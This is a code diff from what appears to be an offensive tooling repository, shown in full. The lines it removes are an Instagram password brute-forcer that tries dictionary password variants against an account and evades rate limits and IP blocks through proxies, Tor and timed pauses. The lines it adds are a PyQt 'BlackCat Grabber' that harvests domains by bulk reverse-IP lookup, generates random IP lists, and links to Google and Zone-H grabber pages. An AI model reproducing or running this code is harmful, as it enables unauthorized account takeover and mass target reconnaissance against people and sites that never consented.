-                                  attempt_number=self.attempts, proxy_used=proxy_used, 
-                                  response_time=response_time)
-
-class ReportGenerator:
-    """Generate comprehensive reports with statistics"""
-    
-    def __init__(self, config: Config):
-        self.config = config
-        self.results = []
-        self.start_time = None
-        self.end_time = None
-    
-    def start_timing(self):
-        """Start timing the brute force attack"""
-        self.start_time = time.time()
-    
-    def end_timing(self):
-        """End timing the brute force attack"""
-        self.end_time = time.time()
-    
-    def add_result(self, result: BruteForceResult):
-        """Add a result to the report"""
-        self.results.append(result)
-    
-    def generate_report(self) -> Dict:
-        """Generate a comprehensive report with statistics"""
-        if not self.start_time or not self.end_time:
-            return {"error": "Timing not started or ended"}
-        
-        total_time = self.end_time - self.start_time
-        successful_attempts = [r for r in self.results if r.success]
-        failed_attempts = [r for r in self.results if not r.success]
-        
-        success_rate = len(successful_attempts) / len(self.results) * 100 if self.results else 0
-        
-        response_times = [r.response_time for r in self.results if r.response_time > 0]
-        response_time_stats = {
-            "min": min(response_times) if response_times else 0,
-            "max": max(response_times) if response_times else 0,
-            "avg": statistics.mean(response_times) if response_times else 0,
-            "p95": sorted(response_times)[min(len(response_times)-1, max(0, int(len(response_times) * 0.95) - 1))] if response_times else 0
-        }
-        
-        proxy_stats = {}
-        proxy_usage = defaultdict(list)
-        proxy_success = defaultdict(int)
-        proxy_failures = defaultdict(int)
-        
-        for result in self.results:
-            if result.proxy_used != "None":
-                proxy_usage[result.proxy_used].append(result.response_time)
-                if result.success:
-                    proxy_success[result.proxy_used] += 1
-                else:
-                    proxy_failures[result.proxy_used] += 1
-        
-        for proxy, times in proxy_usage.items():
-            proxy_stats[proxy] = {
-                "usage_count": len(times),
-                "avg_response_time": statistics.mean(times) if times else 0,
-                "success_rate": proxy_success[proxy] / (proxy_success[proxy] + proxy_failures[proxy]) * 100 if times else 0
-            }
-        
-        # Guard against division by zero
-        attempts_per_second = len(self.results) / total_time if total_time > 0.001 else 0
-        
-        report = {
-            "summary": {
-                "total_attempts": len(self.results),
-                "successful_attempts": len(successful_attempts),
-                "failed_attempts": len(failed_attempts),
-                "success_rate": f"{success_rate:.2f}%",
-                "total_time": f"{total_time:.2f} seconds",
-                "attempts_per_second": attempts_per_second
-            },
-            "response_time_stats": response_time_stats,
-            "proxy_performance": proxy_stats,
-            "successful_passwords": [r.password for r in successful_attempts],
-            "error_messages": list(set(r.message for r in failed_attempts))
-        }
-        
-        return report
-    
-    def save_report(self, report: Dict, file_path: str):
-        """Save report to JSON file"""
-        try:
-            with open(file_path, 'w') as f:
-                json.dump(report, f, indent=2)
-            logging.info(f"Report saved to {file_path}")
-        except Exception as e:
-            logging.error(f"Failed to save report: {str(e)}")
-
-def load_passwords(dict_file: str) -> List[str]:
-    """Load passwords from dictionary file"""
+def resource_path(relative_path):
     try:
-        dict_path = Path(dict_file)
-        if not dict_path.exists():
-            logging.error(f"Dictionary file '{dict_file}' not found.")
-            return []
-        
-        with open(dict_path, 'r', encoding='utf-8', errors='ignore') as f:
-            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-        
-        logging.info(f"Loaded {len(passwords)} passwords from dictionary")
-        return passwords
-    except Exception as e:
-        logging.error(f"Error loading password file: {str(e)}")
+        base_path = sys._MEIPASS
+    except AttributeError:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
+# Construct an absolute path to the BlackCat_Result folder in the user's home directory
+current_dir = QDir.currentPath() + "/BlackCat_Result"
+
+# Ensure the directory exists
+QDir(current_dir).mkpath(".")
+
+try:
+    os.mkdir('BlackCat_Result')
+except:
+    pass 
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36 Edg/117.0.2045.60",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Mobile Safari/537.36",
+]
+
+
+
+def button_start():
+    return """
+        QPushButton {
+            background-color: #8A2BE2;
+            color: white;
+            font-size: 16px;
+            border: none;
+        }
+        QPushButton:hover {
+            background-color: #1ABC9C;
+        }
+        QPushButton:pressed {
+            background-color: cyan;
+        }
+    """
+
+def input_style():
+    return """
+        QLineEdit {
+            background-color: #2C3E50;
+            color: #ECF0F1;
+            font-size: 14px;
+            padding: 10px;
+            border: 2px solid #1ABC9C;
+            border-radius: 10px;
+        }
+        QLineEdit:focus {
+            border: 2px solid #16A085;
+        }
+    """
+
+
+def button_style():
+    return """
+        QPushButton {
+            background-color: #1ABC9C;
+            color: white;
+            font-size: 16px;
+            border: none;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        QPushButton:hover {
+            background-color: #16A085;
+        }
+        QPushButton:pressed {
+            background-color: #1ABC9C;
+        }
+    """
+
+def Editor_TXTStyle():
+    return """
+        QTextEdit {
+            background-color: #2C3E50;
+            color: #ECF0F1;
+            border: 2px solid #1ABC9C;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 10px;
+        }
+
+        QScrollBar:vertical {
+            border: none;
+            background: rgb(52, 73, 94);
+            width: 14px;
+            margin: 15px 0 15px 0;
+            border-radius: 7px;
+        }
+
+        QScrollBar::handle:vertical {
+            background-color: rgb(26, 188, 156);
+            min-height: 30px;
+            border-radius: 7px;
+        }
+        QScrollBar::handle:vertical:hover {
+            background-color: #1ABC9C;
+        }
+        QScrollBar::handle:vertical:pressed {
+            background-color: #16A085;
+        }
+
+        QScrollBar::sub-line:vertical {
+            height: 0px;
+        }
+
+        QScrollBar::add-line:vertical {
+            height: 0px;
+        }
+
+        QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {
+            width: 0px;
+            height: 0px;
+        }
+        QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
+            background: none;
+        }
+    """
+
+
+def read_list(file_path):
+    """Read the IP list from the given file and return it as a list of strings."""
+    if not os.path.exists(file_path):
+        #print(f"Error: The file {file_path} does not exist.")
         return []
-
-async def process_password_batch(brute_forcer: InstagramBruteForcer, username: str, passwords: List[str], 
-                                semaphore: asyncio.Semaphore, config: Config) -> List[BruteForceResult]:
-    """Process a batch of passwords with concurrency control"""
-    results = []
     
-    for password in passwords:
-        async with semaphore:
-            password_variants = brute_forcer.generate_password_variants(password)
-            
-            for variant in password_variants:
-                result = await brute_forcer.attempt_login(username, variant)
-                results.append(result)
-                
-                if result.success:
-                    return results
-                
-                if "rate limit" in result.message.lower():
-                    logging.warning("Rate limit detected. Pausing...")
-                    await asyncio.sleep(random.uniform(20, 40))
-                elif "ip blocked" in result.message.lower():
-                    logging.warning("IP blocked. Pausing...")
-                    await asyncio.sleep(random.uniform(30, 60))
-                elif "no response received" in result.message.lower():
-                    logging.warning("No response received. Slowing down...")
-                    await asyncio.sleep(random.uniform(5, 10))
-                
-                delay = 3.0 if brute_forcer.session_manager.use_direct_connection else 2.0
-                await asyncio.sleep(random.uniform(delay, delay + 1.0))
-    
-    return results
+    with open(file_path, 'r') as file:
+        content = file.read().splitlines()
+    return content
 
-async def main_async():
-    """Main async function for proxy testing and batch processing"""
+def robtex(ip):
     try:
-        config = Config.load_from_file("config.json")
-        logger = setup_logging(
-            log_level=config.logging.log_level,
-            log_file=config.logging.log_file,
-            max_log_size=config.logging.max_log_size,
-            backup_count=config.logging.backup_count
-        )
+        response = requests.get(f'https://freeapi.robtex.com/ipquery/{ip}', verify=False, timeout=10).json()
+        domains = []
+        if response['status'] == 'ok':
+            for value in response.values():
+                try:
+                    for item in value:
+                        domains.append(item['o'])
+                except TypeError:
+                    continue
+        return domains #if domains else None
+    except requests.exceptions.RequestException:
+        return None
+    except:
+        return None
+"""
+Example Qthread
+
+https://doc.qt.io/qtforpython-6/PySide6/QtCore/QThread.html
+https://sihabsahariar.medium.com/a-comprehensive-pyqt5-tutorial-on-qthread-and-qthreadpool-66aa5b768496
+https://realpython.com/python-pyqt-qthread/#:~:text=In%20PyQt%2C%20you%20use%20QThread,the%20thread%20as%20an%20argument.
+class WorkerThread(QThread):
+
+    Q_OBJECT
+    def run():
+        result = QString()
+        /* ... here is the expensive or blocking operation ... */
+        resultReady.emit(result)
+
+# signals
+    def resultReady(s):
+
+def startWorkInAThread(self):
+
+    workerThread = WorkerThread(self)
+    workerThread.resultReady.connect(self.handleResults)
+    workerThread.finished.connect(workerThread.deleteLater)
+    workerThread.start()
+"""
+class DomainCheckerWorker(QThread):
+    # Signal to update the console with responsed result
+    progress = pyqtSignal(str)
+    
+    def __init__(self, ip_list, save_path, selected_api):
+        super().__init__()
+        self.ip_list = ip_list
+        self.save_path = save_path  
+        #print(selected_api) == 'API #1' if selected will print 
+        self.selected_api = selected_api  
+        self.unique_domains = set()  # To store unique domains
+    
+    def handle_rate_limiting(self, retry_count):
+        wait_time = 2 ** retry_count
+        time.sleep(wait_time)
+
+    def reverse_ip_lookup(self, ip, session, retry_count=0):
+        url = f"https://rapiddns.io/sameip/{ip}?full=1&t=None#result"
+        headers = {"User-Agent": random.choice(user_agents)}
+
+        try:
+            response = session.get(url, headers=headers, verify=False, timeout=10)
+
+            if response.status_code == 429:  # 429 is status code of many requests in server
+                if retry_count >= 5:
+                    return None  # Done after Retrying after 5 times
+                else:
+                    self.handle_rate_limiting(retry_count)
+                    return self.reverse_ip_lookup(ip, session, retry_count + 1)  # Count per time
+            soup = BeautifulSoup(response.text, 'html.parser')
+            domains = []
+
+            if soup.find('tbody'):
+                for row in soup.find('tbody').find_all('tr'):
+                    domain = row.find_all('td')[0].text.strip()
+                    domains.append(domain)
+
+            return domains
+
+        except:
+            return None
+
+    def run(self):
+        with requests.Session() as session:
+            for ip in self.ip_list:
+                time.sleep(random.uniform(1, 3))
+                domains = []
+                if self.selected_api == "API #1":
+                    domains = self.reverse_ip_lookup(ip, session)
+                elif self.selected_api == "API #2":
+                    domains = robtex(ip)
+                elif self.selected_api == "API #BOTH":
+                    domains_1 = self.reverse_ip_lookup(ip, session)
+                    domains_2 = []
+                    if not domains_1:
+                        domains_2 = robtex(ip)
+                    domains = (domains_1 or []) + (domains_2 or [])
+
+                if domains:
+                    try:
+                        self.unique_domains.update(domains)  # Add Domain update with Set
+                        self.progress.emit(f"{ip} Domains Founded : {len(domains)}")
+                        with open(self.save_path, 'a') as file:
+                            for domain in domains:
+                                if '*.' in str(domain):
+                                    domain = str(domain).split('*.')[1]
+                                #Emit Domain and WriteFile
+                                self.progress.emit(f"{domain}")
+                                file.write(f"{domain}\n")
+                    except: 
+                        pass 
+                #No found domain or IP has no domain 
+                else:
+                    self.progress.emit(f"{ip} : IP has no Domain")
+
+
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.result_data = ""  #Res Stored
+        self.ip_list = []  # ListIP from  selected file
+        self.save_path = ""
+        self.setWindowTitle("BlackCat Grabber v1.0 | By Team RiverMan")
+        self.setWindowIcon(QIcon(resource_path('Files/icon1.png')))
+        self.setGeometry(200, 100, 1000, 600)
+
+        # Main widget with layout
         
-        proxy_manager = None
-        use_tor = False
+        central_widget = QWidget()
+        self.setCentralWidget(central_widget)
+        main_layout = QHBoxLayout(central_widget)
+
+        # Dark theme
+        self.setStyleSheet("""
+            QWidget {
+                background-color: #1C1C1C;
+                color: white;
+            }
+        """)
+
+        # Sidebar Config
+        self.sidebar_expanded = True
+        self.sidebar_width = 180  
+        self.collapsed_sidebar_width = 60 
+
+        # Side_Frame with border_radius
+        self.sidebar = QFrame()
+        self.sidebar.setStyleSheet("""
+            QFrame {
+                background-color: #2C3E50;
+                border-radius: 9px;
+            }
+        """)
+        self.sidebar.setFixedWidth(self.sidebar_width)
+        self.sidebar_layout = QVBoxLayout(self.sidebar)
+        self.sidebar_layout.setSpacing(0)
+        self.sidebar_layout.setContentsMargins(0, 0, 0, 0)
+
+        # Logo sidebar
+        self.logo = QLabel()
+        self.logo.setFixedHeight(120)
+        self.logo.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        pixmap = QPixmap(resource_path("Files/logo.png"))
+        self.logo.mousePressEvent = self.toggle_sidebar  # Add click event
+        self.logo.setPixmap(pixmap.scaled(90, 120, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
+        self.sidebar_layout.addWidget(self.logo)
+
         
-        if config.connection_method == 'proxy':
-            proxy_manager = AsyncProxyManager(config)
-            print("Testing proxies...")
-            await proxy_manager.get_healthy_proxies()
+
+
+        # sidebar_button
+        sidebar_button = """
+        QPushButton {
+            background-color: #34495E;
+            color: white;
+            font-size: 14px;
+            border: none;
+            text-align: left;
+            padding-left: 10px;
+        }
+        QPushButton:hover {
+            background-color: #1ABC9C;
+        }
+        QPushButton:pressed {
+            background-color: #16A085;
+        }
+        """
+
+        # Sidebar buttons
+        titles = ["Reverse IP", "Generate IP", "Google", "Zone-H"]
+        self.page_buttons = []
+        self.icon_size = QSize(24, 24)
+
+        for i, title in enumerate(titles):
+            button = QPushButton(title)
+            button.setStyleSheet(sidebar_button)
+            button.setFixedHeight(50)
+            button.setIcon(QIcon(resource_path(f"Files/icon{i+1}.png")))
+            button.setIconSize(self.icon_size)
+            button.setCursor(Qt.CursorShape.PointingHandCursor)
+            button.clicked.connect(lambda checked, idx=i: self.animate_page_transition(idx))
+            self.page_buttons.append(button)
+            self.sidebar_layout.addWidget(button)
+
+        # Add stretch Push_Button to the top
+        self.sidebar_layout.addStretch()
+
+        # Sidebar Main_layout
+        main_layout.addWidget(self.sidebar)
+         
+        #https://stackoverflow.com/questions/52596386/slide-qstackedwidget-page
+        # Pages container (QStackedWidget) 
+        self.pages = QStackedWidget()
+        self.pages.setStyleSheet("background-color: None; border-radius: 10px;")
+        main_layout.addWidget(self.pages)
+
+        # AddPages 2 QStackedWidget 
+        self.pages.addWidget(self.ReverseIP_Page0())
+        self.pages.addWidget(DomainToIPPage())
+        self.pages.addWidget(Google_Grabber())
+        self.pages.addWidget(ZoneH_Grabber())
+
+
+    def ReverseIP_Page0(self):
+        page = QWidget()
+        layout = QVBoxLayout(page)
+
+        # TopLayer_BTN
+        top_layout = QGridLayout()
+
+        # File_Selection_BTN with Hover Effects
+        self.file_button = QPushButton("Select *.TXT")
+        self.file_button.setFixedSize(150, 40)
+        self.file_button.setStyleSheet("""
+            QPushButton {
+                background-color: #16A085;
+                color: white;
+                font-size: 16px;
+                border: none;
+            }
+            QPushButton:hover {
+                background-color: #1ABC9C;
+            }
+            QPushButton:pressed {
+                background-color: #16A085;
+            }
+        """)
+        self.file_button.clicked.connect(self.select_file)
+        top_layout.addWidget(self.file_button, 0, 0, Qt.AlignmentFlag.AlignLeft)
+
+        # Radio_BTN for API selection
+        self.api_group = QButtonGroup()
+        self.api1_radio = QRadioButton("API #1")
+        self.api1_radio.setChecked(True)
+        self.api1_radio.setStyleSheet("font-size: 14px; color: white;")
+        self.api_group.addButton(self.api1_radio)
+
+        self.api2_radio = QRadioButton("API #2")
+        self.api2_radio.setStyleSheet("font-size: 14px; color: white;")
+        self.api_group.addButton(self.api2_radio)
+
+        self.api_both_radio = QRadioButton("API #BOTH")
+        self.api_both_radio.setStyleSheet("font-size: 14px; color: white;")
+        self.api_group.addButton(self.api_both_radio)
+
+        # Add_Radio_BTN to my Layout
+        top_layout.addWidget(self.api1_radio, 0, 1)
+        top_layout.addWidget(self.api2_radio, 0, 2)
+        top_layout.addWidget(self.api_both_radio, 0, 3)
+
+        layout.addLayout(top_layout)
+
+        # Console area
+
+        #thank info with scollbar custom modern ui : https://github.com/Wanderson-Magalhaes/Custom_ScrollBar_QtDesigner/blob/main/Scroll-Bar-Custom.ui
+        self.console_area = QPlainTextEdit()
+        self.console_area.setFont(QFont("Arial", 12))
+        self.console_area.setPlaceholderText("Console Log")
+        self.console_area.setStyleSheet("""
+            QPlainTextEdit {
+                background-color: #34495E;  /* Background color for the text area */
+                border: 2px solid #1ABC9C;  /* Border for the text area */
+                padding: 10px;
+                color: white;
+                border-radius: 10px;        /* Rounded corners for the text area */
+            }
+
+            QScrollBar:vertical {
+                border: none;
+                background: rgb(52, 73, 94);
+                width: 14px;
+                margin: 15px 0 15px 0;
+                border-radius: 7px;  /* Rounded corners for the scrollbar background */
+            }
+
+            /* HANDLE BAR VERTICAL */
+            QScrollBar::handle:vertical {	
+                background-color: rgb(26, 188, 156);
+                min-height: 30px;
+                border-radius: 7px;  /* Rounded corners for the handle */
+            }
+            QScrollBar::handle:vertical:hover {	
+                background-color: #1ABC9C;
+            }
+            QScrollBar::handle:vertical:pressed {	
+                background-color: #16A085;
+            }
+
+            /* BTN TOP - SCROLLBAR */
+            QScrollBar::sub-line:vertical {
+                height: 0px;
+            }
+
+            /* BTN BOTTOM - SCROLLBAR */
+            QScrollBar::add-line:vertical {
+                height: 0px;
+            }
+
+            /* RESET ARROW */
+            QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {
+                width: 0px;
+                height: 0px;
+            }
+            QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
+                background: none;
+            }
+        """)
+        self.console_area.setReadOnly(True)  # Allow_USER Permission Read_Only
+        layout.addWidget(self.console_area)
+
+        #  START and SAVE
+        save_start_layout = QHBoxLayout()
+
+        # Start_BTN
+        self.start_button = QPushButton("Start")
+        self.start_button.setFixedSize(150, 40)
+        self.start_button.setStyleSheet(button_start())
+        self.start_button.setEnabled(False)
+        self.start_button.clicked.connect(self.START_Rev)
+        save_start_layout.addWidget(self.start_button, Qt.AlignmentFlag.AlignRight)
+
+        # Save_BTN
+        self.save_button = QPushButton("Save *.TXT")
+        self.save_button.setFixedSize(150, 40)
+        self.save_button.setStyleSheet("""
+            QPushButton {
+                background-color: #1ABC9C;
+                color: white;
+                font-size: 16px;
+                border: none;
+            }
+            QPushButton:hover {
+                background-color: #16A085;
+            }
+            QPushButton:pressed {
+                background-color: #1ABC9C;
+            }
+        """)
+        self.save_button.clicked.connect(self.SAVE_REVDATA)
+        save_start_layout.addWidget(self.save_button, Qt.AlignmentFlag.AlignLeft)
+
+        layout.addLayout(save_start_layout)
+
+        page.setLayout(layout)
+        return page
+
+  
+    def select_file(self):
+        """OpenFile Dialog todo select File"""
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select File", "", "Text Files (*.txt)")
+        if file_path:
+            self.ip_list = read_list(file_path) 
+            if self.ip_list:
+                self.start_button.setEnabled(True)  
+            else:
+                return 
+                #print("The selected file is empty or cannot be read.")
+
+    def START_Rev(self):
+        """Function when users click start Reverse IP"""
+        if not self.ip_list:
+            #print("No IP addresses to process.")
+            return
+    
+        self.console_area.clear()
+        self.result_data = ""   
+
+        # Which users was selected
+        if self.api1_radio.isChecked():
+            selected_api = "API #1"
+        elif self.api2_radio.isChecked():
+            selected_api = "API #2"
+        else:
+            selected_api = "API #BOTH"
+    
+        if not self.save_path:
+            return 
+
         
-        elif config.connection_method == 'tor':
-            use_tor = True
-            print("\n[!] Make sure Tor is running with ControlPort 9051")
+        self.tasker = DomainCheckerWorker(self.ip_list, self.save_path, selected_api)
+        self.tasker.progress.connect(self.update_console)
+        self.tasker.start()
+
+    def SAVE_REVDATA(self):
+        """Save Result"""
+        save_path, _ = QFileDialog.getSaveFileName(self, "Save File", f"{current_dir}", "Text Files (*.txt)")
+        if save_path:
+            try:
+                self.save_path = save_path
+                with open(save_path, 'w') as file: 
+                    file.write(self.result_data) 
+            except:
+                pass 
+
+    def update_console(self, message):
+        self.console_area.appendPlainText(message)
+
+    def animate_page_transition(self, new_index):
+        self.pages.setCurrentIndex(new_index)
+
+    def toggle_sidebar(self, event):
+        titles = ["Reverse IP", "Generate IP", "Google", "Zone-H"]
+        """https://youtu.be/Kp8lA294U1g 
+        Toggle with animation on sidebar"""
+        if self.sidebar_expanded:
+            self.animate_sidebar(self.sidebar_width, self.collapsed_sidebar_width)
+            for button in self.page_buttons:
+                button.setText("")   
+                button.setIconSize(self.icon_size)
+                button.setStyleSheet("""
+                    QPushButton {
+                        background-color: #34495E;
+                        color: white;
+                        font-size: 16px;
+                        border: none;
+                        text-align: center;
+                    }
+                    QPushButton:hover {
+                        background-color: #1ABC9C;
+                    }
+                    QPushButton:pressed {
+                        background-color: #16A085;
+                    }
+                """)
+        else:
+            self.animate_sidebar(self.collapsed_sidebar_width, self.sidebar_width)
+            for i, button in enumerate(self.page_buttons):
+                button.setText(titles[i])  # Restore the text from titles list
+                button.setIconSize(self.icon_size)
+                button.setStyleSheet("""
+                    QPushButton {
+                        background-color: #34495E;
+                        color: white;
+                        font-size: 14px;
+                        border: none;
+                        padding-left: 10px;
+                        text-align: left;
+                    }
+                    QPushButton:hover {
+                        background-color: #1ABC9C;
+                    }
+                    QPushButton:pressed {
+                        background-color: #16A085;
+                    }
+                """)
+        self.sidebar_expanded = not self.sidebar_expanded
+    #Smooth animation with func toggle_sidebar
+    def animate_sidebar(self, start_width, end_width):
         
-        session_manager = SessionManager(config, proxy_manager, use_tor)
-        brute_forcer = InstagramBruteForcer(config, session_manager)
-        report_generator = ReportGenerator(config)
-        
-        passwords = load_passwords(config.password_file)
-        if not passwords:
-            print("No passwords loaded. Exiting.")
+        self.animation = QPropertyAnimation(self.sidebar, b"minimumWidth")
+        self.animation.setDuration(300)  # Animation duration in milliseconds
+        self.animation.setStartValue(start_width)
+        self.animation.setEndValue(end_width)
+        self.animation.start()
+#############################################################################
+#Page 2 
+
+##https://www.digitalocean.com/community/tutorials/python-get-ip-address-from-hostname
+
+class DomainToIP_Func(QThread):
+    result_signal = pyqtSignal(str)
+
+    def __init__(self, domain, path_result, parent=None):
+        super().__init__(parent)
+        self.domain = domain
+        self.save_file = path_result
+
+    def run(self):
+        try:
+            #maybe skip result if reduce number with this will make your code slow but make its work without skip IP 
+            socket.setdefaulttimeout(7)
+            ip_address = socket.gethostbyname(self.domain)
+            self.result_signal.emit(f"{self.domain} --> {ip_address}")
+            with open(self.save_file, 'a') as data_ip:
+                data_ip.write(ip_address + '\n')
+        except socket.error:
+            self.result_signal.emit(f"{self.domain} --> Failed")
+
+class DomainToIPPage(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.ip_list = []
+        self.threads = []
+        self.save_path = ""
+        self.qt_UI()
+
+    def qt_UI(self):
+        layout = QVBoxLayout(self)
+        self.setLayout(layout)
+
+        # JUST ADD Title 
+        title_label = QLabel("Bulk Domain to IP")
+        title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
+        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        layout.addWidget(title_label)
+
+        # Button Row for domain operations (small buttons)
+        button_layout = QHBoxLayout()
+        button_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        button_layout.setSpacing(20)  # Add spacing between buttons
+
+        # Console Log for Reverse IP Lookup (rich text box)
+        reverse_ip_console_section = QGroupBox("")
+        reverse_ip_console_layout = QVBoxLayout()
+        self.console_log = QTextEdit(self)
+        self.console_log.setPlaceholderText("Console Log")
+        self.console_log.setReadOnly(True)
+        self.console_log.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
+        self.console_log.setStyleSheet(Editor_TXTStyle())
+        # self.console_log.setStyleSheet("""
+        #     QTextEdit {
+        #         background-color: #2C3E50;
+        #         color: #ECF0F1;
+        #         border: 2px solid #1ABC9C;
+        #         padding: 10px;
+        #         font-size: 14px;
+        #         border-radius: 10px;
+        #     }
+
+        #     QScrollBar:vertical {
+        #         border: none;
+        #         background: rgb(52, 73, 94);
+        #         width: 14px;
+        #         margin: 15px 0 15px 0;
+        #         border-radius: 7px;  /* Rounded corners for the scrollbar background */
+        #     }
+
+        #     /* HANDLE BAR VERTICAL */
+        #     QScrollBar::handle:vertical {	
+        #         background-color: rgb(26, 188, 156);
+        #         min-height: 30px;
+        #         border-radius: 7px;  /* Rounded corners for the handle */
+        #     }
+        #     QScrollBar::handle:vertical:hover {	
+        #         background-color: #1ABC9C;
+        #     }
+        #     QScrollBar::handle:vertical:pressed {	
+        #         background-color: #16A085;
+        #     }
+
+        #     /* BTN TOP - SCROLLBAR */
+        #     QScrollBar::sub-line:vertical {
+        #         height: 0px;
+        #     }
+
+        #     /* BTN BOTTOM - SCROLLBAR */
+        #     QScrollBar::add-line:vertical {
+        #         height: 0px;
+        #     }
+
+        #     /* RESET ARROW */
+        #     QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {
+        #         width: 0px;
+        #         height: 0px;
+        #     }
+        #     QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
+        #         background: none;
+        #     }
+        # """)
+        reverse_ip_console_layout.addWidget(self.console_log)
+        reverse_ip_console_section.setLayout(reverse_ip_console_layout)
+        layout.addWidget(reverse_ip_console_section)
+
+        self.load_txt_btn = QPushButton('Domain Load')
+        self.load_txt_btn.setFixedSize(150, 40)
+        self.load_txt_btn.setStyleSheet(button_style())
+        self.load_txt_btn.clicked.connect(self.Select_List)
+
+        self.start_dom2ip_btn = QPushButton('Start Dom2IP')  
+        self.start_dom2ip_btn.setFixedSize(150, 40)
+        self.start_dom2ip_btn.setStyleSheet(button_start())
+        self.start_dom2ip_btn.setEnabled(False)
+        self.start_dom2ip_btn.clicked.connect(self.START_DumperIP)
+
+        self.save_result_btn = QPushButton('Save IPList')
+        self.save_result_btn.setFixedSize(200, 40)
+        self.save_result_btn.setStyleSheet(button_style())
+        self.save_result_btn.clicked.connect(self.Save_ReverseIPResults)
+
+        button_layout.addWidget(self.load_txt_btn)
+        button_layout.addWidget(self.start_dom2ip_btn)
+        button_layout.addWidget(self.save_result_btn)
+
+        layout.addLayout(button_layout)
+
+        ip_output_console_section = QGroupBox("")
+        ip_output_console_layout = QVBoxLayout()
+        self.ip_console = QTextEdit(self)
+        self.ip_console.setPlaceholderText("Generated Log")
+        self.ip_console.setReadOnly(True)
+        self.ip_console.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
+        self.ip_console.setStyleSheet(Editor_TXTStyle())
+        ip_output_console_layout.addWidget(self.ip_console)
+        ip_output_console_section.setLayout(ip_output_console_layout)
+        layout.addWidget(ip_output_console_section)
+
+        input_layout = QHBoxLayout()
+        self.how_many_ip_input = QLineEdit(self)
+        self.how_many_ip_input.setFixedWidth(250)
+        self.how_many_ip_input.setPlaceholderText("How many IPs")
+        self.how_many_ip_input.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        self.how_many_ip_input.setStyleSheet(input_style())
+
+        self.generate_ip_btn = QPushButton("Generate IP")
+        self.generate_ip_btn.setFixedSize(150, 40)
+        self.generate_ip_btn.setStyleSheet(button_start())
+        self.generate_ip_btn.clicked.connect(self.Generator_IP)
+
+        self.save_generated_ip_btn = QPushButton("Save GenerateList")
+        self.save_generated_ip_btn.setFixedSize(150, 40)
+        self.save_generated_ip_btn.setStyleSheet(button_style())
+        self.save_generated_ip_btn.clicked.connect(self.Save_GeneratedIP)
+
+        input_layout.addWidget(self.generate_ip_btn)
+        input_layout.addWidget(self.how_many_ip_input)
+        input_layout.addWidget(self.save_generated_ip_btn)
+
+        layout.addLayout(input_layout)
+
+    def URL2HOST(self, site):
+        if site.startswith("http://"):
+            site = site.replace("http://", "")
+        elif site.startswith("https://"):
+            site = site.replace("https://", "")
+        site = site.strip()
+        pattern = re.compile(r'([^/]+)')
+        match = re.findall(pattern, site)
+        if match:
+            domain = match[0]
+        else:
+            domain = urlparse(site).netloc
+        return domain
+
+    def Select_List(self):
+        """OpenFILE Select IP"""
+        iplist_path, _ = QFileDialog.getOpenFileName(self, "Select File", "", "Text Files (*.txt)")
+        if iplist_path:
+            with open(iplist_path, 'r') as file:
+                self.ip_list = [line.strip() for line in file]
+            if self.ip_list:  
+                self.start_dom2ip_btn.setEnabled(True)  # Enable Domain to IP Start_BTN
+            else:
+                print("The selected file is empty or cannot be read.")
+
+    def START_DumperIP(self):
+        if not self.ip_list:
+            self.console_log.setPlainText("No domains loaded.")
             return
         
-        report_generator.start_timing()
+        if not self.save_path:
+            QMessageBox.warning(self, "No Save Path", "Please select a valid save path.")
+            return
         
-        print(f"\nStarting brute-force attack on '{config.username}'")
-        print(f"Method: {config.connection_method.upper()}")
-        print(f"Passwords: {len(passwords)}")
-        print(f"Encryption: {config.encryption_method.upper()}")
-        print("-" * 40)
+        self.console_log.append("IPLog will show results:")
+        for domain in self.ip_list:
+            thread = DomainToIP_Func(domain, self.save_path)
+            thread.result_signal.connect(self.update_console_log)
+            thread.start()
+            self.threads.append(thread)
+       
+    def update_console_log(self, result):
+        self.console_log.append(result)
+
+    def Generator_IP(self):
+        try:
+            count = int(self.how_many_ip_input.text())
+            generated_ips = []
+            for _ in range(count):
+                ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+                generated_ips.append(ip)
+            self.ip_console.setPlainText("\n".join(generated_ips))
+        except ValueError:
+            self.ip_console.setPlainText("Please Type number of IP you want Generate")
+
+
+    def Save_GeneratedIP(self):
+        save_ip, _ = QFileDialog.getSaveFileName(self, "Save File", f"{current_dir}", "Text Files (*.txt)")
+        if save_ip:
+            try:
+                with open(save_ip, 'w') as file:
+                    file.write(self.ip_console.toPlainText())
+                self.ip_console.setPlainText(f"Generated IPs saved successfully to: {save_ip}")
+            except Exception as e:
+                self.ip_console.setPlainText(f"Error saving file: {e}")
+
